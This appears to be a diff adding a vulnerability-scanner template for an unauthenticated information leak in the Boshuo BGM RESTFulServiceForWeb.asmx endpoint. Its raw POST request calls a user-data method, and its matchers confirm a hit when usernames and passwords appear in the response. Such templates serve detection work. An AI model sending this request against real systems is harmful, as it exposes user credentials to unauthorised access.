@@ -1,0 +1,30 @@
+id: boshuoBGM-RESTFulServiceForWeb-info
+
+info:
+  name: 博硕BGM RESTFulServiceForWeb.asmx 存在敏感信息泄露漏洞
+  author: boshuoBGM
+  severity: high
+  tags: boshuoBGM
+
+http:
+  - raw:
+      - |
+        POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/Do?id= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+        Connection: keep-alive
+        Content-Type: application/json
+
+        {"Resource":"MethodCluster","Parameter":[["Method","Sky.PlatForm.Core.clsUser.GetData"],["Para","{\"$VER$\":{},\"filter\":{\"OrderBy\":\"DeptId,UserId,CreateDate DESC\"}}"]]}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'UserId'
+          - 'UserPassWord'
+          - 'UserType'
+        condition: and
